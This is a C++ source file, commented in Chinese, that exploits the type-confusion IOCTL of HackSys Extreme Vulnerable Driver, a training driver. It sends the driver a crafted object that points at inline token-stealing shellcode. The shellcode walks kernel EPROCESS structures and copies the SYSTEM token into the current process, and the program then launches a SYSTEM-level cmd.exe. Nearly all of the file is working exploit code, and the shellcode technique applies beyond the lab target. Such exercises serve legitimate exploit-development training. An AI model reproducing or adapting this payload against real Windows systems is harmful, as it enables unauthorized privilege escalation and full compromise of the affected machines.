// 7TypeConfusion漏洞.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <Windows.h>
   #define HACKSYS_EVD_IOCTL_TYPE_CONFUSION                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_NEITHER, FILE_ANY_ACCESS)
//#include "TypeConfusion.h"
typedef struct _USER_TYPE_CONFUSION_OBJECT {
	ULONG_PTR objectID;
	ULONG_PTR objectType;
} USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT;

DWORD WINAPI    TypeConfusionThread(LPVOID Parameter);

void CreateCmd()
{
	STARTUPINFO si={0};
	PROCESS_INFORMATION pi={0};
	si.dwFlags=STARTF_USESHOWWINDOW;
	si.wShowWindow=SW_SHOW;
	WCHAR wzFilePath[MAX_PATH]={L"cmd.exe"};
	bool bret=CreateProcessW(NULL,wzFilePath,NULL,NULL,false,CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi);
	if (bret)
	{
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}


}



void ShellCode()
{
	__asm
	{
		nop;
		pushad;
		mov eax,fs:[0x124];
		mov eax,[eax+0x150];//current process
		mov ecx,eax;
		mov edx,4;

find_sys_pid:
		mov eax,[eax+0xb8];//active process
		sub eax,0xb8;//eprocess
		cmp [eax+0xb4],edx;
		jnz find_sys_pid;
		//find it
		mov eax,[eax+0xf8];//systemprocess token
		mov [ecx+0xf8],eax;
		popad;
		//ret;
	}
}



DWORD WINAPI TypeConfusionThread(LPVOID Parameter) {
	HANDLE hFile = NULL;
	ULONG BytesReturned;
	//LPCSTR FileName = (LPCSTR)DEVICE_NAME;
	PVOID EopPayload = &ShellCode;
	PUSER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject = NULL;

	__try {

		DWORD recvBuf;
		// 获取句柄
		HANDLE hFile = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 
			GENERIC_READ | GENERIC_WRITE,
			NULL,
			NULL,
			OPEN_EXISTING,
			NULL,
			NULL);

		printf("Start to get HANDLE...\n");
		if (hFile == INVALID_HANDLE_VALUE || hFile == NULL)
		{
			printf("获取句柄失败\n");
			return 0;
		}


		// Allocate the Heap chunk
		UserTypeConfusionObject = (PUSER_TYPE_CONFUSION_OBJECT)HeapAlloc(GetProcessHeap(),
			HEAP_ZERO_MEMORY,
			sizeof(USER_TYPE_CONFUSION_OBJECT));




		UserTypeConfusionObject->objectID = (ULONG_PTR)0x01;
		UserTypeConfusionObject->objectType = (ULONG_PTR)EopPayload;



		DeviceIoControl(hFile,
			HACKSYS_EVD_IOCTL_TYPE_CONFUSION,
			(LPVOID)UserTypeConfusionObject,
			sizeof(USER_TYPE_CONFUSION_OBJECT),
			NULL,
			0,
			&BytesReturned,
			NULL);


		HeapFree(GetProcessHeap(), 0, (LPVOID)UserTypeConfusionObject);

		UserTypeConfusionObject = NULL;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

	}

	return EXIT_SUCCESS;
}





int _tmain(int argc, _TCHAR* argv[])
{

		TypeConfusionThread(NULL);
		CreateCmd();
	return 0;
}

